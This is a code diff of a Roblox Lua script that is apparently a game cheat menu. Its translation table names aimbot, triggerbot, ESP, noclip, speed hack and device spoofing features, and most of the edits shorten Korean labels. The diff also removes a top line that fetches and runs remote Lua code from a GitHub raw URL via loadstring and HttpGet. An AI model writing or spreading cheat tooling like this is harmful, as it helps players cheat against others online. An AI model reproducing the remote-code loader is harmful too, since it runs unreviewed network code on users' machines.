@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/cjwstar25-png/WJNof9r29jk1oi23134/refs/heads/main/Cubic.lua"))()
- 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -70,10 +68,10 @@ local Translations = {
         FOVRadius = "FOV Radius", ShowFOV = "Show FOV Circle"
     },
     KO = {
-        Combat = "전투 시스템", Visuals = "시각 및 ESP", Player = "플레이어 강화", Misc = "세계 및 기타",
-        Aimbot = "에임봇", Ragebot = "레이지봇", WallCheck = "벽 관통 체크", Triggerbot = "트리거봇", AntiAim = "시각적 안티에임",
+        Combat = "전투 시스템", Visuals = "시각 및 ESP", Player = "플레이어 강화", Misc = "기타",
+        Aimbot = "에임봇", Ragebot = "레이지봇", WallCheck = "벽 관통 체크", Triggerbot = "트리거봇", AntiAim = "안티에임",
         ESPMaster = "ESP 마스터", SkeletonESP = "스켈레톤", BoxESP = "박스 ESP", HealthBar = "체력 바", PlayerInfo = "정보 표시",
-        TracerLines = "트레이서 라인", TeamFilter = "팀 필터링", Chams = "참스 / 하이라이트", InfJump = "무한 점프",
+        TracerLines = "트레이서 라인", TeamFilter = "팀 필터링", Chams = "하이라이트", InfJump = "무한 점프",
         FlyMode = "비행 모드", Noclip = "노클립", SpeedHack = "스피드 핵", Forced3P = "강제 3인칭", SkyChanger = "스카이 대기효과",
         DeathAudio = "데스 오디오", Cursor = "무지개 커서", FPSOpt = "프레임 최적화", Spoof = "기기 스푸핑",
         Properties = "고급 속성 설정", SwitchHitbox = "타겟 히트박스", ToggleSky = "대기 모드 전환",
